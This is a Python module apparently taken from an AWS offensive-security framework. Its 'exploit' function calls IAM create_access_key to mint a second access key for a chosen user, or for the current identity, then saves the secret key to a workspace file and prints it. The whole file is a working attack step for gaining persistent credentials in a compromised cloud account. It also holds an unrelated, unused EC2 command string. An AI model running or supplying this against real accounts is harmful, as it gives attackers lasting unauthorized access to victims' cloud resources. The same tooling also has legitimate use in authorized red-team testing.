from termcolor import colored
from datetime import datetime
import json

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "iam",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"USER": {
		"value": "",
		"required": "false",
        "description":"The username to add the 2nd key. If not set, the current credentials will gain a 2nd key. The user needs to have only one credential to be able to use this module."
	}
}
description = "Create a 2nd access key to a user. To do this, the user needs to have only one access key."

aws_command = "aws ec2 describe-launch-templates --region {} --profile {}"

def exploit(profile, workspace):
	now = datetime.now()
	dt_string = now.strftime("%d_%m_%Y_%H_%M_%S")

	user = variables['USER']['value']

	if not user == "":
		response = profile.create_access_key(
			UserName=user
		)
	else:
		response = profile.create_access_key()

	json_data = response['AccessKey']

	if user == "":
		user = json_data['UserName']

	file = "{}_iam_{}".format(dt_string, user)
	filename = "./workspaces/{}/{}".format(workspace, file)

	with open(filename, 'w') as outfile:
		json.dump(json_data, outfile, indent=4, default=str)
		print(colored("[*] Content dumped on file '{}'.".format(filename), "green"))

	output = ""
	title_name = 'UserName'
	output += colored("---------------------------------\n", "yellow", attrs=['bold'])
	output += colored("{}: {}\n".format(title_name, json_data[title_name]), "yellow", attrs=['bold'])
	output += colored("---------------------------------\n", "yellow", attrs=['bold'])

	for key, value in json_data.items():
		output += "\t{}: {}\n".format(
			colored(key, "red"),
			colored(value, "blue")
		)
	print(output)
	output = ""